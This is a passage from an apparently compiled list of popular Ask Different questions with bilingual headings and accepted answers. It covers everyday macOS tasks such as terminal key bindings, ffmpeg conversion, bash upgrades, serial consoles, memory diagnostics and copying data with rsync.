end:  \033[F

You can get the \033 part by hitting the escape key within the edit dialog input, if you need to add it.
In later versions of Mac OS X, if the terminal screen shifts up or down when you press the home/end key, the home key may need to be set to \033[1~ and the end key to \033[4~ to get the results you want (no shift needed).
Conclusion
Then home and end will work like normal again (phew).
Also note that alt+← and alt+→ by default in terminal map to word left and word right, another handy combo to remember.
Feel free to modify this answer to add more useful key bindings, as it is a community wiki.

---

#### 88. Remember window sizes and placement when unplugging and replugging second monitor

**问题描述 / Problem Description**:
Tags: macos, windows, display, window-manager, productivity | Score: 157 | Views: 68974 | Answers: 13

**解决方案 / Solution**:
Have a look at Stay by Cordless Dog. I believe it does exactly what you're looking for.

---

#### 89. Is there a way to convert audio files in Mac OS X or the command line without using iTunes?

**问题描述 / Problem Description**:
Tags: macos, audio, unix | Score: 156 | Views: 137510 | Answers: 9

**解决方案 / Solution**:
I installed ffmpeg via MacPorts, although it also available via Homebrew (brew install ffmpeg) or download the binary.
To convert something like that, (without worrying about audio quality, which I know nothing about), I just use:
ffmpeg -i input.mp4 output.mp3

Here is an example of how you would convert a .wav file to .mp3 from their website:
ffmpeg -i input.wav -codec:a libmp3lame -qscale:a 2 output.mp3 

Here is an example of how to find all .wav files larger than 50M, convert them to mp3 and then delete the original wav file (aka, batch mode -- alter the find command to create your 'batch')
find . -size +50M -iname '*.wav' -type f -exec ffmpeg -i {} -codec:a libmp3lame -qscale:a 2 {}.mp3 -y \; -exec /bin/rm {} \;

If you don't want to delete the source file, say in case the conversion fails or you want to have both:
find . -size +50M -iname '*.wav' -type f -exec ffmpeg -i {} -codec:a libmp3lame -qscale:a 2 {}.mp3 -y \;

Note that the -y overwrites existing files without prompting so if you want to not have that you can remove it.

---

#### 90. How do I start the docker daemon on macOS?

**问题描述 / Problem Description**:
Tags: macos, daemons, docker | Score: 154 | Views: 547378 | Answers: 9

**解决方案 / Solution**:
An alternative solution is to use other runtime for docker. For example
colima
brew install colima
colima start
docker ps -a

Since docker desktop isn't free for enterprise usage, the alternative runtime is a good option.
NOTE: if you've previously used Docker Desktop for launching Docker daemon and had an export of DOCKER_HOST defined in your user's shell configuration (.bash_profile, .zsh_profile etc.), you need to re-specify DOCKER_HOST to make sure it points to .colima directory and commands like docker-compose up -d work properly.
Example:
export DOCKER_HOST=unix:///$HOME/.colima/docker.sock

---

#### 91. Update bash to version 4.0 on OSX

**问题描述 / Problem Description**:
Tags: macos, terminal, bash, command-line | Score: 154 | Views: 138259 | Answers: 6

**解决方案 / Solution**:
As @William said in his answer, Apple does not provide bash 4 due to GPL restrictions. You can install bash 4+ however and also can make it your default shell (including for Terminal and iTerm2) by doing the following.

Install Bash 4 via Homebrew

First install the newer version of bash. There are various ways of doing that, I prefer Homebrew.


Install Homebrew as described at http://brew.sh.  
Install bash using brew install bash.


Bash 4 is now available on your PATH (assuming Homebrew bin is on your path). However, it is not yet your default shell. You can find where it is located by running which bash. In my case it is at /usr/local/bin/bash. 

Using Bash 4

Since it is on your PATH, you can start a Bash 4 session with just bash or it can be used in scripts by using a Shebang.

For example, this will use a specific bash instance.

#!/usr/local/bin/bash
...your script...


This will use the first bash on the PATH.

#!/usr/bin/env bash
...your script...


You can also set the bash path for specific profiles in Terminal/iTerm2 using the steps described in @user136952's answer.

Making Bash 4 the default

As mentioned above, after installing Bash 4 is still not the default shell. To make bash the default you need to do two more steps.

First, add the Bash 4 path to your /etc/shells file so that it is an allowed login shell. As described in /etc/shells, this file has the list of valid login shells. After adding the new bash path my /etc/shells looks like the following:

# List of acceptable shells for chpass(1).
# Ftpd will not allow users to connect who are not using
# one of these shells.

/bin/bash
/bin/csh
/bin/ksh
/bin/sh
/bin/tcsh
/bin/zsh
/usr/local/bin/bash


Next we use chsh to make it your default shell. So any sessions for that user will use that shell. You can read more about this in Change the Shell in Mac OS X Terminal, but the actual command is very straightforward.

chsh -s /usr/local/bin/bash


Now the new bash is our default login shell. If you open Terminal or iTerm2 and run bash --version you should see the new version. Note the "License GPLv3+" which is why Apple doesn't bundle it with macOS.

$ bash --version
GNU bash, version 4.4.12(1)-release (x86_64-apple-darwin16.6.0)
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;

---

#### 92. cmd-tab behavior on Mavericks with multiple displays

**问题描述 / Problem Description**:
Tags: macos, display, application-switcher | Score: 153 | Views: 87913 | Answers: 5

**解决方案 / Solution**:
I believe this coincides with the Dock's location.  Just tested it on my MacBook Air, connected to a non-Apple external display, and whenever I moved the Dock from screen to screen the Application Switcher would follow.

You can summon the Dock on your big display by dragging the cursor to the bottom of it's display, essentially dragging down at the bottom.  After a second the Dock should pop up.  Once the Dock is on the desired display press commandtab to summon the Application Switcher.

---

#### 93. macOS notifications on dual monitors: how can I specify which monitor?

**问题描述 / Problem Description**:
Tags: macos, notifications, dual-screen | Score: 152 | Views: 96074 | Answers: 3

**解决方案 / Solution**:
You should be able to do this by choosing the monitor on which the menu bar is active.
Try:

System Settings -&gt; Displays -&gt; Arrangement

and drag the little white bar to the monitor where you want the notifications to show up.
In the picture below, the bar is being dragged from the left to the right window.

---

#### 94. Restricting Command+tab options to only apps that are in the current space

**问题描述 / Problem Description**:
Tags: macos, spaces | Score: 152 | Views: 67784 | Answers: 12

**解决方案 / Solution**:
Refer to the original page for detailed solutions and community answers.

---

#### 95. Is there a command line program for macOS that can access serial ports?

**问题描述 / Problem Description**:
Tags: macos, command-line | Score: 151 | Views: 675404 | Answers: 16

**解决方案 / Solution**:
You can use the terminal command screen to do this!!!

As seen on ServerFault:


  I love using [screen] for connecting to serial consoles, i.e.

screen /dev/ttyS0 19200



Or, if you prefer Mac OS X hints...


  I often have to do router configuration via a console port, so I use a
  Keyspan Serial Adapter to get access. Two problems then present
  themselves: ZTerm is a horrible Mac OS X app. It hasn't been updated
  in five years or so, and isn't a Universal Binary. The developer
  doesn't seem in any hurry to rectify the situation. It is not worth
  the shareware fee in its current form. Minicom requires installation
  of Fink or MacPorts and is overly complex. Solution: Use screen,
  Terminal, and a little AppleScripting.
  
  First, launch Script Editor and type/paste in the following code:

tell application "Terminal"
  do script with command "screen /dev/tty.KeySerial1"
  set number of rows of window 1 to 100
  set number of columns of window 1 to 80
  set background color of window 1 to "black"
  set normal text color of window 1 to "green"
  set custom title of window 1 to "SerialOut"
end tell

  
  Compile and save as an app from within Script Editor, and you have a
  double-clickable application to launch a serial Terminal session. You
  may want to customize this slightly -- you can change the screen
  colors or number of columns or rows. You may also need to customize
  the screen command with a different device name if you are using
  something other than the Keyspan Serial Adapter (do an ls tty* of the
  /dev/ directory to get the right name). 
  
  screen uses Control-A to take commands directed to it. So type
  Control-A followed by Control-\ to exit your screen session. If you
  fail to do this and exit a Terminal session, you'll leave the screen
  session alive and the serial resource unavailable until you kill the
  screen session manually. man screen will show you further commands to
  send to a screen session. 
  
  If anyone can reply with a link to a tutorial on how to wrap an
  interactive Unix App in Cocoa, that would be the next step -- it would
  be nice to do this without involving Terminal. If you prefer to use
  Minicom, you could still use the AppleScript to wrap it into a nice
  launchable app -- use this older hint to find the right command line
  commands.


Many USB-Serial adapters use the chip from FTDI. Install the "Virtual COM Port" driver and look for the proper TTY name in /dev. For example, on a PowerBook G4 it came up as /dev/tty.usbserial-FTALKY8I.

---

#### 96. How do I sync the Visual Studio Code (vscode) theme to use my OS light/dark color scheme?

**问题描述 / Problem Description**:
Tags: macos, system-settings, visual-studio-code | Score: 151 | Views: 54183 | Answers: 3

**解决方案 / Solution**:
Enable Auto Detect (Search in Settings: window.autoDetectColorScheme)
Customize Color Themes (Search in Settings: workbench preferred color theme)


More Detail (Visual Studio Code Themes):

Auto switch based on OS color scheme Windows and macOS support light and dark color schemes. There is a setting, window.autoDetectColorScheme, that instructs VS Code to listen to changes to the OS's color scheme and switch to a matching theme accordingly.
To customize the themes that are used when a color scheme changes, you can set the preferred light, dark, and high contrast themes with the settings:
workbench.preferredLightColorTheme - defaults to &quot;Default Light+&quot;
workbench.preferredDarkColorTheme - defaults to &quot;Default Dark+&quot;
workbench.preferredHighContrastColorTheme - defaults to &quot;Default High Contrast&quot;
workbench.preferredHighContrastLightColorTheme - defaults to &quot;Default High Contrast Light&quot;

---

#### 97. How to record both screen and sound with Quicktime on El Capitan?

**问题描述 / Problem Description**:
Tags: macos, quicktime, screen-capture | Score: 150 | Views: 438170 | Answers: 12

**解决方案 / Solution**:
You  need to install Soundflower in order to run it on El Capitan. El Capitan requires kext to be signed in order to load them. This one gets its kext installed in /Library/Extensions/.

This is due to System Integrity Protection

Then, you have to create a multi-output device with: Audio MIDI Setup.app, which is found in /Applications/Utilities/ :



Finally, when you want to do the actual recording, make sure you use this multi-output device, and capture from the same Soundflower device used in this multi-output device. Otherwise, you can't both listen to and capture the sound, because it goes directly to soundflower without being copied to the built-in output.

alt/option + right clicking on volume gives you this menu:



and Quicktime now looks like this:

---

#### 98. Should I disconnect my MacBook Pro&#39;s power cord when the battery is fully charged?

**问题描述 / Problem Description**:
Tags: macbook-pro, battery, charging | Score: 149 | Views: 263777 | Answers: 12

**解决方案 / Solution**:
You do not need to disconnect your MacBook Pro's battery. Your battery will stop charging once it is full. Apple's modern batteries are much smarter than previous designs.

To get the most out of your MacBook Pro's battery, follow the Notebook Battery advice from Apple: unplug and use your battery until empty about once a month, then charge back up to full.

At the time of answering, Apple's advice read:


  For proper maintenance of a lithium-based battery, it’s important to keep the electrons in it moving occasionally. Apple does not recommend leaving your portable plugged in all the time. An ideal use would be a commuter who uses her notebook on the train, then plugs it in at the office to charge. This keeps the battery juices flowing.


If you need help following Apple's advice, use Battery Guardian; it is free and will remind you when to deplete your battery.

---

#### 99. Is there a keyboard shortcut to navigate one level up in Finder?

**问题描述 / Problem Description**:
Tags: macos, finder | Score: 148 | Views: 91953 | Answers: 1

**解决方案 / Solution**:
The one you're probably looking for is the command ⬆︎ keyboard shortcut, as this is the one that takes you back to the parent folder. 

To do the same thing, but within a new window, use command control ⬆︎.

However, some views offer additional options. For example, in Columns view you can just use the ⬅︎ key to go back to the parent folder.

In addition, you can use the command [ keyboard shortcut to take you back to the previous folder you were actually in (which may not necessarily be the parent folder).

You can also right-click on the title in the Finder's window to select anywhere in the file's path to go straight to that location.

Finally, you can also customise the Toolbar to add the Path button.

---

#### 100. How to investigate high kernel task memory usage?

**问题描述 / Problem Description**:
Tags: macos, memory, performance, kernel-panic, kernel | Score: 147 | Views: 233652 | Answers: 2

**解决方案 / Solution**:
There are many things that go wrong with high kernel task usage. Usually this is related to faulty or heavy process which overusing system resources (such as indexing storage, running VMs, too many tabs in the web browser or some other background processes). 

Here are some methods which help to investigate OS X kernel usage issues:

Basic methods


Run Console.app and check on 'All Messages' to see if anything unusual currently is happening.
Use Activity Monitor to read system memory and determine how much CPU, RAM and Disk is being used.

Alternatively run top in Terminal and hold Space to refresh - easier to find the cause problem (swapins/swapouts/disks?).
Run sudo fs_usage in Terminal to report system calls and page faults related to filesystem activity in real-time (I think this is the best option from all other). Then hit Control-C to stop it.

Action: Consider killing apps which appears frequently on the list, but you're not using them.

Learn more at: How do I debug an out-of-control “kernel_task” process?
Run sudo syscallbypid.d (or syscallbyproc.d), wait a bit, hit Control-C. Now check which process generated the most system calls in that given time (last column) and if you recognise it, consider kill it. If not, Google it and learn more about it.


Advanced methods


Use sysdiagnose command (can be triggered by hitting Shift-Control-⌥-⌘-. (period) to quickly gather system-wide diagnostic information helpful in investigating system memory/performance issues (will appear in /var/tmp) either by you or Apple guys. During analysis, try to not do anything, when done - consider uncompressing the generated file and analyse the logs.

See: How do you get system diagnostic files from OS X?
Run footprint to gather detailed memory information on a per-VM-region type level and swapped bytes:

sudo footprint -a


Older version:

sudo footprint -all -categories -swapped -collapseSharing

Use spindump to profile entire system, it'll generate /tmp/spindump.txt file (including kernel and its extensions).
Use vm_stat to show virtual memory statistics. E.g.

vm_stat 1 # to display every second.

Use zprint to check information about kernel usage, it's possible by:

sudo zprint -t -s | head -n20


It'll show the most wasting kernel zones.
Use newproc.d to snoop new processes as they are executed, creatbyproc.d for files:

sudo newproc.d
sudo creatbyproc.d


Note: On newer OS X (10.11 or above) this may not work when integrity protection is enabled (check by csrutil status). 
Try sar - system activity reporter which can sample and report various cumulative statistic counters maintained by the operating system.


For more useful debugging tools, check for dtrace scripts (grep dtrace /usr/bin/*). If you know the faulty process which causing the problem, you may use dtruss to debug it.



Actions

Here are some suggestions which can help you with the operating system issues.


Free up some inactive memory. In order to do this, you've to flush cache first and force disk cache to be purged:

sync &amp;&amp; sudo purge



  sync - force completion of pending disk writes (flush cache)
  
  purge - force disk cache to be purged (flushed and emptied)


Its function is basically to terminate all the I/O pending operations which are using disk cache and then to free all the occupied disk cache, so it should free disk space to ease paging out and swapping out of main memory. It is safe to use, as it does not affect anonymous memory that has been allocated through malloc, vm_allocate, etc.
Use some 3rd party apps to clear up some overused memory such as iBoostUp, SystemPal, etc.
You may also disable temporary Spotlight:

sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.metadata.mds.plist 


And consider other services by:

sudo launchctl list | grep ^[0-9]
sudo launchctl bslist | grep ^A

Quit your web browser and check if that helps. For example using Chrome is very resourceful, especially when there is some front-end processing going on in the background (e.g. Javascript) or advert-like animations are constantly rendering the content.

---

#### 101. git auto-complete for *branches* at the command line?

**问题描述 / Problem Description**:
Tags: terminal, command-line, bash, auto-complete, git | Score: 488 | Views: 332073 | Answers: 16

**解决方案 / Solution**:
Ok, so I needed the git autocompletion script.
I got that from this url using the following command in the Terminal app:
curl https://raw.githubusercontent.com/git/git/master/contrib/completion/git-completion.bash -o ~/.git-completion.bash

No need to worry about what directory you're in when you run this as your home directory(~) is used with the target.
Then I added to my ~/.bash_profile file the following 'execute if it exists' code:
if [ -f ~/.git-completion.bash ]; then
  . ~/.git-completion.bash
fi

Update: I'm making these bits of code more concise to shrink down my .bashrc file, in this case I now use:
test -f ~/.git-completion.bash &amp;&amp; . $_

Note: $_ means the last argument to the previous command. so . $_ means run it - &quot;it&quot; being .git-completion.bash in this case
This still works on both Ubuntu and OSX and on machines without the script .git-completion.bash script.
Now git Tab (actually it's git TabTab ) works like a charm!
p.s.: If this doesn't work off the bat, you may need to run chmod u+x ~/.git-completion.bash to grant yourself the necessary permission:

chmod is the command that modifies file permissions
u means the user that owns the file, by default its creator, i.e. you
+ means set/activate/add a permission
x means execute permission, i.e. the ability to run the script

---

#### 102. What is the difference between .bash_profile and .bashrc?

**问题描述 / Problem Description**:
Tags: terminal, command-line, bash | Score: 433 | Views: 360248 | Answers: 5

**解决方案 / Solution**:
.bash_profile is executed for login shells, while .bashrc is executed for interactive non-login shells.

When you login (type username and password) via console, either sitting at the machine, or remotely via ssh: .bash_profile is executed to configure your shell before the initial command prompt.

But, if you’ve already logged into your machine and open a new terminal window (xterm) then .bashrc is executed before the window command prompt. .bashrc is also run when you start a new bash instance by typing /bin/bash in a terminal.

On OS X, Terminal by default runs a login shell every time, so this is a little different to most other systems, but you can configure that in the preferences.

---

#### 103. Why doesn&#39;t .bashrc run automatically?

**问题描述 / Problem Description**:
Tags: terminal, command-line, bash | Score: 288 | Views: 574354 | Answers: 14

**解决方案 / Solution**:
Been there, done that. What I came aware of, OS X doesn't read .bashrc file on bash start. Instead, it reads the following files (in the following order):


/etc/profile
~/.bash_profile
~/.bash_login   
~/.profile


See also Chris Johnsen's informative and useful comment:


  By default, Terminal starts the shell via /usr/bin/login, which makes the shell a login shell. On every platform (not just Mac OS X) bash does not use .bashrc for login shells (only /etc/profile and the first of .bash_profile, .bash_login, .profile that exists and is readable). This is why "put source ~/.bashrc in your .bash_profile" is standard advice


I usually just put the things that I'd normally put in ~/.bashrc to ~/.profile — has worked so far like a charm.

---

#### 104. How to use terminal to copy a file to the clipboard?

**问题描述 / Problem Description**:
Tags: mac, terminal | Score: 286 | Views: 274471 | Answers: 11

**解决方案 / Solution**:
If I'm understanding the question right, what you're after is pbcopy and pbpaste.
Open a terminal and run:
cat ~/Desktop/ded.html | pbcopy

The file is now in your clipboard.
To put it somewhere else (i.e. paste it) run:
pbpaste &gt; ~/Documents/ded.html

Now you should have a copy of ded.html sitting in ~/Documents.

---

#### 105. Is there a Mac OS X Terminal version of the &quot;free&quot; command in Linux systems?

**问题描述 / Problem Description**:
Tags: terminal, memory, command-line | Score: 262 | Views: 380680 | Answers: 22

**解决方案 / Solution**:
As @khedron says, you can see this info in Activity Monitor.
If you want it on the command line, here is a Python script that I wrote (or perhaps modified from someone else's, I can't remember, it's quite old now) to show you the Wired, Active, Inactive and Free memory amounts:
#!/usr/bin/python

import subprocess
import re

# Get process info
ps = subprocess.Popen(['ps', '-caxm', '-orss,comm'], stdout=subprocess.PIPE).communicate()[0].decode()
vm = subprocess.Popen(['vm_stat'], stdout=subprocess.PIPE).communicate()[0].decode()

# Iterate processes
processLines = ps.split('\n')
sep = re.compile('[\s]+')
rssTotal = 0 # kB
for row in range(1,len(processLines)):
    rowText = processLines[row].strip()
    rowElements = sep.split(rowText)
    try:
        rss = float(rowElements[0]) * 1024
    except:
        rss = 0 # ignore...
    rssTotal += rss

# Process vm_stat
vmLines = vm.split('\n')
sep = re.compile(':[\s]+')
vmStats = {}
for row in range(1,len(vmLines)-2):
    rowText = vmLines[row].strip()
    rowElements = sep.split(rowText)
    vmStats[(rowElements[0])] = int(rowElements[1].strip('\.')) * 4096

print('Wired Memory:\t\t%d MB' % (vmStats[&quot;Pages wired down&quot;]/1024/1024))
print('Active Memory:\t\t%d MB' % (vmStats[&quot;Pages active&quot;]/1024/1024))
print('Inactive Memory:\t%d MB' % (vmStats[&quot;Pages inactive&quot;]/1024/1024))
print('Free Memory:\t\t%d MB' % (vmStats[&quot;Pages free&quot;]/1024/1024))
print('Real Mem Total (ps):\t%.3f MB' % (rssTotal/1024/1024))

As you can see, you can just call vm_stat from the command line, though it counts in 4kB pages, hence the script to convert to MB.
The script also counts up the &quot;real memory&quot; usage of all running processes for comparison (this won't match any specific value(s) from overall memory stats, because memory is a complex beast).

Here's an example of the output of the script on my system:
[user@host:~] % memReport.py
Wired Memory:           1381 MB
Active Memory:          3053 MB
Inactive Memory:        727 MB
Free Memory:            1619 MB
Real Mem Total (ps):    3402.828 MB

(very slightly adjusted to match the tab sizing on StackExchange ;)

---

#### 106. What is the difference between iTerm2 and Terminal?

**问题描述 / Problem Description**:
Tags: terminal, command-line, iterm | Score: 208 | Views: 254811 | Answers: 10

**解决方案 / Solution**:
There are several features listed on their features page.

Some of the features I like are:


Split pane view
Hotkey window for instant terminal anywhere
Search will highlight all found words (like in Chrome and Safari)
Mouseless copy
Instant replay (can "rewind" your session in case you forgot to note/copy something)
Paste history
Growl support for notification when a process completes

---

#### 107. How can I open a Terminal window directly from my current Finder location?

**问题描述 / Problem Description**:
Tags: terminal, finder | Score: 207 | Views: 407489 | Answers: 18

**解决方案 / Solution**:
As of Mac OS X Lion 10.7, Terminal provides Services for opening a new terminal window or tab at the selected folder in Finder. They also work with absolute pathnames selected in text (in any application). You can enable these services with System Preferences > Keyboard > Keyboard Shortcuts > Services. Look for "New Terminal at Folder" and "New Terminal Tab at Folder". You can also assign them shortcut keys.

In addition, you can now drag folders (and pathnames) onto the Terminal application icon to open a new terminal window, or onto a tab bar in a terminal window to create a new tab in that window. If you drag onto a tab (rather than into the terminal view) it will execute a complete cd command to switch to that directory without any additional typing.

As of OS X Mountain Lion 10.8, Command-Dragging into a terminal will also execute a complete cd command.

Note: The New Terminal at Folder service will become active when you select a folder in Finder. You cannot simply have the folder open and run the service "in place". Go back to the parent folder, select the relevant folder, then activate the service via the Services menu or context menu.

---

#### 108. iTerm as a slide-out terminal from the top of the screen

**问题描述 / Problem Description**:
Tags: terminal, iterm | Score: 193 | Views: 171843 | Answers: 6

**解决方案 / Solution**:
You can use iTerm2's system-wide hotkey with the Hotkey Window profile to do this.
In iTerm2 preferences, click on the &quot;Keys&quot; tab and choose &quot;Hotkey&quot;. Click &quot;Create a Dedicated Hotkey Window…&quot; and assign the hotkey you'd like to use.
Check the &quot;Hotkey toggles a dedicated window with profile:&quot; option and choose &quot;Hotkey Window&quot; in the popup menu below (should be selected by default).
With default settings, the Hotkey Profile window will stretch across the top of the screen, and the hotkey will drop the window down from the top, complete with animation.


You can customize the settings for the &quot;Hotkey Window&quot; profile under the &quot;Profiles&quot; tab. To make it look like a Quake drop-down terminal, you can use similar &quot;Window&quot; preferences:

---

#### 109. How do I delete all Terminal mail?

**问题描述 / Problem Description**:
Tags: terminal, email, unix | Score: 174 | Views: 149574 | Answers: 4

**解决方案 / Solution**:
Launch the UNIX mail utility by running the following at the command prompt (in e.g. Terminal.app):
$ mail

You'll see a list of all your messages. From the mail prompt, do
? delete *
? q

And that should be it. Make sure to enter q after the delete * command. This will save the changes to disk.

---

#### 110. How do I set environment variables on OS X?

**问题描述 / Problem Description**:
Tags: terminal, bash, environment-variables | Score: 173 | Views: 910373 | Answers: 12

**解决方案 / Solution**:
I have a .profile in my home directory; it contains many export … statements for environment variables.
You can create such a file by opening a Terminal and issuing the command touch .profile.
Close Terminal.
Then you should open that file in a plain-text editor (TextWrangler for example). You can also use nano .profile in a Terminal window (current directory should be your home), which is much easier than vi. Insert lines such as export JAVA_HOME=…. Save, exit nano if you used that and quit a running Terminal.
Open Terminal and issue the command env to see all environment variables. Check that the ones you defined have the value you assigned to them. You should be good to go now but don't forget that environment variables defined in .profile are not passed to GUI applications.

---

#### 111. How can I mount an SMB share from the command line?

**问题描述 / Problem Description**:
Tags: terminal, smb, mount | Score: 162 | Views: 553962 | Answers: 9

**解决方案 / Solution**:
Use the open(1) command and a URL:

open 'smb://username:password@server/share'


Pros: Creates the mount point in /Volumes for you.

Cons: Requires the Finder to be running.

---

#### 112. How can I keep my Mac awake AND locked?

**问题描述 / Problem Description**:
Tags: macos, security, sleep-wake, power | Score: 147 | Views: 221872 | Answers: 8

**解决方案 / Solution**:
In System Preferences &gt; Energy Saver, check the box for &quot;Prevent computer from sleeping automatically when the display is off&quot; (on laptops, this is under the Power Adapter tab)
In System Preferences &gt; Security &amp; Privacy, check the box for &quot;Require password after sleep or screen saver begins&quot; and set the delay in the dropdown menu to &quot;immediately&quot;

Now, you can hit command+option+Q  to turn off the display without sleeping the computer, and doing anything that turns on the display (like hitting a key or clicking a mouse button) will prompt you for your account password.
On older Macs, the shortcut is different: command+option+Power or control+shift+power.

---

#### 113. How to open a new tab in iTerm in the same folder as the one that is open?

**问题描述 / Problem Description**:
Tags: terminal, iterm | Score: 147 | Views: 63617 | Answers: 4

**解决方案 / Solution**:
Select "Reuse previous session's directory" from the preferences of your profile:



Alternatively click on "Advanced Configuration" then "Edit..." so you can set the working directory separately for new windows, new tabs &amp; new split panes

---

#### 114. The volume can&#39;t be ejected because it&#39;s currently in use

**问题描述 / Problem Description**:
Tags: external-disk, eject, macos | Score: 145 | Views: 203648 | Answers: 10

**解决方案 / Solution**:
lsof is indeed your best bet. The fastest and easiest way would be this :-
sudo lsof /Volumes/myDrive

(be sure to run with sudo otherwise it probably won't work as intended)
It can take a couple minutes to run, but once it's complete, it gives you a list of open files on the disk. The output will look something like this:
COMMAND    PID  USER   FD   TYPE DEVICE SIZE/OFF  NODE NAME
mds         89  root   19r   DIR   52,3      432     2 /Volumes/Photos
mds         89  root   23r   DIR   52,3      432     2 /Volumes/Photos
Finder     681 alans   14r   DIR   52,3      432     2 /Volumes/Photos
QuickLook 2158 alans    9r   REG   52,3  1141591 78651 /Volumes/Photos/_tmp_iphone_10_backup/APC_1546.JPG  

In this case, it's the QuickLook application that has a file open. Closing the application directly is the best way to fix the issue. However, that's not always possible. For example, QuickLook doesn't show up as an application you can get to in the Dock.
If you can't close the application manually, you can use the kill command to terminate it from the command line. To do that, use the PID from the second column as the ID to kill. From the above example, it would be:
kill 2158

Note that sometimes that doesn't work and a more aggressive form of kill must be used. Here's a series of escalating aggressiveness (using the example PID of 2158):
kill 2158
sudo kill 2158
sudo kill -INT 2158
sudo kill -KILL 2158

You should be able to eject the disk once the process/application has been killed.
One final note, lsof can take a minute or two. It can also hang, but you should give it at least a few minutes before you decide that's what happened.
Also, sometimes the base command sudo lsof /Volumes/myDrive won't find anything. If that happens, try adding the +D argument (i.e. sudo lsof +D /Volumes/myDrive). That will do a top down scan of the disk. It'll take longer, but it should pick up anything that's causing the disk to be un-ejectable.
(Hat tip to Alec Jacobson's post for extra details.)

---

#### 115. How can I list and edit all defined aliases in Terminal?

**问题描述 / Problem Description**:
Tags: terminal, bash, alias | Score: 145 | Views: 302446 | Answers: 3

**解决方案 / Solution**:
All you need to do is type alias at the prompt and any active aliases will be listed.

Aliases are usually loaded at initialization of your shell so look in .bash_profile or .bashrc in your home directory.  

unalias will only work for your current session.  Unless you find where it is defined and loaded, it will be loaded again when you start a new Terminal session.

~/.bashrc gets run for both login and non-login shells, ~/.bash_profile only gets run for login shells.  

See login shell vs non-login shell

As per comment from Chris Page:

You should put most of your customizations (including aliases) in ~/.bashrc and have ~/.bash_profile run ~/.bashrc, so they apply to both login (~/.bash_profile) and non-login (~/.bashrc) shells. Also, decide which of these should be "primary" and if the profile is your choice, tack on the rc file at the end. If the rc file is primary, source that at the beginning of your profile

These lines should be in the file ~/.bash_profile:

if [ -f "$HOME/.bashrc" ] ; then
  source $HOME/.bashrc
fi


This will include ~/.bashrc for login shells and in the order you wish if one file depends upon the other based on what you are setting.

---

#### 116. Replace Text Edit as the default text editor

**问题描述 / Problem Description**:
Tags: macos, text-editor, launch-services | Score: 144 | Views: 137559 | Answers: 11

**解决方案 / Solution**:
Another option is to use duti (https://github.com/moretension/duti).
Run brew install duti, save a filetype like this as:
duti -s com.sublimetext.4 public.plain-text all

The changes should be applied immediately, so you don't have to restart like when editing com.apple.LaunchServices.plist.
To also change the default application for executable scripts with no filename extension, add a line like this:
duti -s com.sublimetext.4 public.unix-executable all

Some files are also considered 'public.data', not 'public.plain-text', so you can do this as well:
duti -s com.sublimetext.4 public.data all

---

#### 117. How can I make ctrl+right/left arrow stop changing Desktops in Lion?

**问题描述 / Problem Description**:
Tags: macos, mission-control | Score: 144 | Views: 86632 | Answers: 2

**解决方案 / Solution**:
Go to System Preferences > Keyboard > Shortcuts > Mission Control and change the settings for "Move left a space" and "Move right a space" or disable them completely.

---

#### 118. How do I move a window whose title bar is off-screen?

**问题描述 / Problem Description**:
Tags: macos, applications | Score: 143 | Views: 127173 | Answers: 21

**解决方案 / Solution**:
Hold on option (or alt) while clicking the Window menu.  This should change Bring All to Front into Arrange in Front, which did the trick for me.

This worked for me on OSX 10.9.1

---

#### 119. How to open files in another app via Terminal on macOS?

**问题描述 / Problem Description**:
Tags: macos, terminal, command-line | Score: 142 | Views: 1276914 | Answers: 3

**解决方案 / Solution**:
To open any file from the command line with the default application, just type open followed by the filename/path.

Example:

open ~/Desktop/filename.mp4


Edit: as per Johnny Drama's comment below, if you want to be able to open files in a certain application, put -a followed by the application's name in quotes between open and the file.

Example:

open -a "QuickTime Player" ~/Desktop/filename.mp4


If you need further information about the open command, type man open.

---

#### 120. How to bring back multi-touch gestures after it crashes without reboot?

**问题描述 / Problem Description**:
Tags: macos, multi-touch, bettertouchtool | Score: 140 | Views: 83968 | Answers: 8

**解决方案 / Solution**:
Run the command killall Dock in Terminal.
In my case, only Mission Control gestures had stopped working (three finger swipe left/right to switch spaces, three finger swipe up for overview, mission control etc).

---

#### 121. Fastest and safest way to copy massive data from one external drive to another

**问题描述 / Problem Description**:
Tags: macos, finder, backup, file-transfer | Score: 140 | Views: 282097 | Answers: 6

**解决方案 / Solution**:
remote sync, rsync, is a reliable choice for copying large amounts of data. You can prepare the command and perform a dry-run before committing to the copy; add --dry-run to simulate the copy.

Your final command will be fairly simple:

sudo rsync -vaE --progress /Volumes/SourceName /Volumes/DestinationName


The flags are:


v increases verbosity.
a applies archive settings to mirror the source files exactly, including symbolic links and permissions.
E copies extended attributes and resource forks (OS X only).
--progress shows progress during the copy.


sudo, is used to ensure rsync has appropriate rights to access and read all files on your drive regardless of owner. This also allows rsync to write the files to the new drive recreating the original owner information.

rsync is likely the best choice because it can be rerun in case of problems, offers detailed logging, and is as fast as can be while remaining safe.

There are numerous guides for getting the most from rsync, rsync command examples provides relevant examples. Take care with the trailing slashes; these can make a world of difference if your copy starts with a folder.

Alternative tools include ditto and cp. Both are reasonable choices but offer differing syntax.

---

#### 122. How do I disable the Minimize (command-M) shortcut?

**问题描述 / Problem Description**:
Tags: keyboard, macos, contextual-menu | Score: 140 | Views: 39914 | Answers: 10

**解决方案 / Solution**:
You don't need to install any additional software.


Go to System Preferences > Keyboard > Shortcuts > App Shortcuts
Click the  button below 
Enter "Minimize" (use "Minimize All" to override minimizing all windows with ⌥⌘M) into the Menu Title text input field.
Assign some bizzare key combination that you won't press by accident.
Repeat steps three and four for "Minimise" (alternate spelling) which is required for some apps.
Close the window to save the changes.




I'm aware that this is not really "disabling it" but the result is effectively the same and without depending on 3rd party software.

---

#### 123. How do I open the context menu from a Mac keyboard?

**问题描述 / Problem Description**:
Tags: macos, keyboard, contextual-menu, spellcheck | Score: 140 | Views: 83262 | Answers: 22

**解决方案 / Solution**:
I always have the same question but I didn't find the answer yet.
In Windows, when we use the keyboard short-cuts we mostly use the Menu key in Windows keyboard:

When this Menu key is pressed, Windows will assume that you right-clicked the highlighted/active element &gt; then it will show you the context menu even if the mouse pointer is not pointing to the highlighted element.
So this feature seems to be missing in Mac OS. And whatever suggested solutions, even Enable Mouse Key it always require you to point/move your mouse pointer to element first, which is meaningless. If I need to use the keyboard short-cut to open the context menu on the highlighted item, why do I need again to move the mouse pointer to it also. Somehow this is not a short-cut!!

---

#### 124. DNS not resolving on Mac OS X

